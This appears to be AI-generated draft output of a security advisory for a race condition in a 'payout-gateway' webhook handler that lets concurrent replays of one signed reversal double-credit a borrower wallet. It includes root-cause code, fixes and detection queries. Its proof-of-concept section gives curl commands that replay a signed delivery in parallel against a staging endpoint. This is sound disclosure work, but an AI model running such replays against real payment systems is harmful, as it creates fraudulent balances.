# v3 · + Few-Shot Examples (raw output)

> Larger Claude model, fresh subagent, 2026-11-06. Verbatim; nothing edited.

---

# Security Advisory: Concurrent webhook replay double-credits borrower wallets in `payout-gateway`

| Field | Value |
|---|---|
| **Package** | `payout-gateway` |
| **Affected versions** | `2.3.1` (commit `4be81c2`). This is the only version tested. Earlier and later versions have not been checked. |
| **Patched versions** | None yet |
| **CVE** | Not assigned. A request is pending. |
| **Weakness** | CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition. Related: CWE-362. |
| **Severity (proposed)** | Medium, CVSS 3.1 **5.3**: `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N`. See the severity rationale below. |
| **Tested in** | Staging (`api.example.test`), 2026-11-03 |

---

## Summary

The `POST /webhooks/wallet/payout-status` handler checks whether a webhook event has already been processed. It then credits the wallet, and only after that does it record the event as processed. Two or more concurrent requests that carry the same validly signed `payout.reversed` delivery all pass the check before any of them records the event. Each request then credits the borrower's wallet.

In staging, one ₱5,000.00 (`500000` centavos) reversal was credited twice. The wallet balance went from `0` to `1000000` centavos, and two ledger rows were written with the same event reference.

Sequential replays are rejected correctly. Only concurrent delivery triggers the flaw.

---

## Root cause

`src/webhooks/payoutStatus.ts`, `handlePayoutStatus()`:

- **Line 56** checks `db.processedEvents.exists(evt.event_id)`.
- **Line 60** awaits `wallet.credit(...)`. This calls the wallet service and took about 180 ms in the researcher's observation.
- **Line 62** runs `db.processedEvents.insert(evt.event_id)` only after the credit has completed.

The check and the insert are not atomic, and the slow call between them widens the race window. Every request that arrives before the first insert completes passes the line 56 check.

There is also no database-level guard. The `processed_events.event_id` column has no unique constraint (confirmed with `\d processed_events`), so concurrent inserts of the same `event_id` all succeed.

```ts
52  export async function handlePayoutStatus(req: Request, res: Response) {
53    const sig = req.header('X-Wallet-Signature')
54    if (!verifyHmac(req.rawBody, sig, process.env.WALLET_WEBHOOK_SECRET)) return res.status(401).end()
55    const evt = JSON.parse(req.rawBody.toString())
56    if (await db.processedEvents.exists(evt.event_id)) {          // check
57      return res.status(200).json({ status: 'duplicate_ignored' })
58    }
59    if (evt.type === 'payout.reversed') {
60      await wallet.credit(evt.data.borrower_id, evt.data.amount_centavos, { ref: evt.event_id })  // act
61    }
62    await db.processedEvents.insert(evt.event_id)                 // record (too late)
63    return res.status(200).json({ status: 'ok' })
64  }
```

---

## Proof of concept (staging)

**Prerequisites**

- A validly signed `payout.reversed` delivery. This means the raw body plus its `X-Wallet-Signature` header.
- The delivery's `event_id` must not yet be present in `processed_events`.

In testing, the delivery was downloaded from the payment provider's **sandbox** dashboard using "Download raw delivery". The researcher noted that any merchant user with the `viewer` role can download these files, including the signature header.

**1. Baseline wallet balance**

```bash
curl -sk -H "Authorization: Bearer <REDACTED_JWT>" "https://192.0.2.10:8443/admin/wallets/<BORROWER_ID>"
```
```json
{"borrower_id":"<BORROWER_ID>","msisdn":"<REDACTED_MSISDN>","balance_centavos":0}
```

**2. Captured delivery**

```bash
cat delivery_8812.json
SIG=$(cat delivery_8812.sig)   # <REDACTED_SIGNATURE>
```
```json
{"event_id":"evt_01JB7K2Q8M","type":"payout.reversed","data":{"borrower_id":"<BORROWER_ID>","amount_centavos":500000}}
```

**3. Control test: a sequential replay is rejected as expected**

```bash
curl -sk -X POST "https://192.0.2.10:8443/webhooks/wallet/payout-status" -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
# {"status":"ok"}
curl -sk -X POST "https://192.0.2.10:8443/webhooks/wallet/payout-status" -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
# {"status":"duplicate_ignored"}
```

**4. Reset the test state, then send the same delivery twice in parallel**

```bash
for i in 1 2; do curl -sk -X POST "https://192.0.2.10:8443/webhooks/wallet/payout-status" -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json & done; wait
```
```
{"status":"ok"}{"status":"ok"}
```

**5. Result: the wallet was credited twice**

```bash
curl -sk -H "Authorization: Bearer <REDACTED_JWT>" "https://192.0.2.10:8443/admin/wallets/<BORROWER_ID>"
```
```json
{"borrower_id":"<BORROWER_ID>","msisdn":"<REDACTED_MSISDN>","balance_centavos":1000000}
```

```bash
psql -h 192.0.2.20 -U <REDACTED_DB_USER> -c "select id, borrower_id, amount_centavos, ref from wallet_ledger where ref='evt_01JB7K2Q8M';"
```
```
  id   | borrower_id   | amount_centavos |      ref
-------+---------------+-----------------+---------------
 …     | <BORROWER_ID> |          500000 | evt_01JB7K2Q8M
 …     | <BORROWER_ID> |          500000 | evt_01JB7K2Q8M
(2 rows)
```

**Reproduction rate**

- **2 parallel requests:** double credit in 20 of 20 attempts. No special timing was needed.
- **5 parallel requests:** 3 credits in one run and 2 credits in the other runs. The number of 5-way runs was not recorded.

---

## Impact

**What was demonstrated**

In staging, one signed `payout.reversed` event credited a borrower wallet more than once:

- 2 times with 2 parallel requests
- up to 3 times with 5 parallel requests

Each extra credit is a full copy of `amount_centavos`, and each one writes its own `wallet_ledger` row with the same `ref`.

**What was not demonstrated**

- Exploitation against production.
- Whether a production provider dashboard exposes signed deliveries the way the sandbox dashboard does.
- A way for an outside attacker to get a signed delivery *before* the gateway processes it. After the gateway records an event, replays return `duplicate_ignored`.
- Whether the provider's own retry logic can send the same event concurrently and trigger the bug with no attacker involved.

---

## Severity rationale

The proposed score is CVSS 3.1 **5.3 (Medium)**. Each metric reflects only what was observed.

- **AV:N:** The endpoint is reachable over HTTPS.
- **AC:H:** The attack only works with a signed delivery whose `event_id` has not been processed yet. The attacker does not control that condition. Winning the race itself was trivial in testing (20 of 20).
- **PR:L:** In testing, the signed delivery came from a provider dashboard account with the `viewer` role.
- **I:H / C:N / A:N:** The bug lets someone create unauthorized wallet balance. No data disclosure or loss of availability was observed.

The score should be re-evaluated if either of these is shown:

- Signed, unprocessed deliveries can be obtained without privileges.
- Provider retries trigger the bug in normal operation.

For example, `AC:L/PR:N` scores **7.5 (High)**. The researcher's initial "probably high" estimate is not supported by the current evidence.

---

## Remediation

There are two layers. Apply both.

**1. Claim the event atomically before crediting**

Make the database the single arbiter of "first request wins." This requires a unique constraint and an insert that reports whether it actually inserted a row.

```sql
-- Find existing duplicates first; the constraint cannot be added while they exist.
SELECT event_id, count(*) FROM processed_events GROUP BY event_id HAVING count(*) > 1;

ALTER TABLE processed_events
  ADD CONSTRAINT processed_events_event_id_key UNIQUE (event_id);
```

```ts
// db.processedEvents.insertIfAbsent(eventId): Promise<boolean>
// INSERT INTO processed_events (event_id) VALUES ($1)
//   ON CONFLICT (event_id) DO NOTHING
//   RETURNING event_id
// -> true only when this call inserted the row
```

```diff
   const evt = JSON.parse(req.rawBody.toString())
-  if (await db.processedEvents.exists(evt.event_id)) {
-    return res.status(200).json({ status: 'duplicate_ignored' })
-  }
-  if (evt.type === 'payout.reversed') {
-    await wallet.credit(evt.data.borrower_id, evt.data.amount_centavos, { ref: evt.event_id })
-  }
-  await db.processedEvents.insert(evt.event_id)
-  return res.status(200).json({ status: 'ok' })
+  const claimed = await db.processedEvents.insertIfAbsent(evt.event_id)
+  if (!claimed) {
+    return res.status(200).json({ status: 'duplicate_ignored' })
+  }
+  if (evt.type === 'payout.reversed') {
+    try {
+      await wallet.credit(evt.data.borrower_id, evt.data.amount_centavos, {
+        ref: evt.event_id,
+        idempotencyKey: evt.event_id,
+      })
+    } catch (err) {
+      await db.processedEvents.release(evt.event_id) // let the provider's retry reprocess it
+      throw err
+    }
+  }
+  return res.status(200).json({ status: 'ok' })
```

**2. Make the credit itself idempotent**

Releasing a claim after a failure is only safe if the credit itself cannot run twice. A wallet service call can time out after it has already succeeded.

- The wallet service should honor `idempotencyKey`.
- Add a unique index on the ledger reference. Maintainers need to confirm that `ref` is meant to be unique for credit entries before doing this.

```sql
CREATE UNIQUE INDEX wallet_ledger_ref_uniq ON wallet_ledger (ref);  -- adjust if ref may legitimately repeat
```

**Important: the unique constraint on `processed_events` alone does not fix this.** With the current code order, the second request still credits the wallet before its `insert()` fails.

---

## Workarounds

There is no configuration-only workaround.

Until the code fix ships, one option is to serialize webhook processing per `event_id`. Two ways to do that:

- A per-event lock, for example `pg_advisory_xact_lock(hashtext(event_id))`, held across the check, the credit and the insert.
- A single-concurrency queue for webhook handling.

If the wallet service writes `wallet_ledger` directly, the ledger unique index from step 2 also blocks additional credits.

---

## Detection

Look for past occurrences of duplicate credits:

```sql
SELECT ref, borrower_id, count(*) AS credits, sum(amount_centavos) AS total_centavos
FROM wallet_ledger
GROUP BY ref, borrower_id
HAVING count(*) > 1;
```

The extra rows should be corrected with compensating ledger entries. Do not delete them.

---

## Additional findings (lower severity, not independently exploited)

- **No replay window on signatures.** The signed payload contains no timestamp, and no tolerance window is enforced, so a captured `X-Wallet-Signature` never expires. The deduplication in `processed_events` currently prevents sequential replay. If the provider supports a signed timestamp, verify it and reject deliveries outside a short window.
- **Signed deliveries visible to low-privilege dashboard users.** This was observed in the provider's sandbox dashboard only. It should be reported to the provider separately.
- **Similar handler not tested.** `src/webhooks/refundStatus.ts` was not examined. Maintainers should review it, and any other webhook handler, for the same check-then-act pattern.

---

## Credits

TODO: researcher's preferred credit name.

## Timeline

- **2026-11-03:** Issue found and reproduced in staging.
- TODO: vendor notification, fix release and publication dates.

---

### Editor's notes (internal; remove before publication)

1. **Redactions made.** The following were removed or replaced:
   - Bearer JWT (`payout_admin` role) → `<REDACTED_JWT>`
   - `WALLET_WEBHOOK_SECRET` value → removed entirely
   - Webhook signature → `<REDACTED_SIGNATURE>`
   - Internal IPs → `192.0.2.10` (gateway) and `192.0.2.20` (database)
   - Internal hostname → `api.example.test`
   - Database user → `<REDACTED_DB_USER>`
   - Borrower MSISDN → `<REDACTED_MSISDN>`
   - Borrower ID → `<BORROWER_ID>`
   - Ledger row IDs → `…`
   - Researcher initials and the internal contact for the CVE request → omitted
2. **Rotate credentials.** The staging JWT and the staging webhook secret were recorded in plain text in the source notes. Rotate both.
3. **Verify the reset step before publishing.** The parallel test reused `evt_01JB7K2Q8M` after the sequential test had already recorded it, and the notes only say "reset wallet." For step 4 to return `ok`, `processed_events` must also have been cleared. Confirm the exact reset procedure so maintainers can reproduce the test.
4. **Confirm before final scoring.** Get maintainer agreement on the CVSS vector. Confirm whether `wallet_ledger.ref` is meant to be unique.
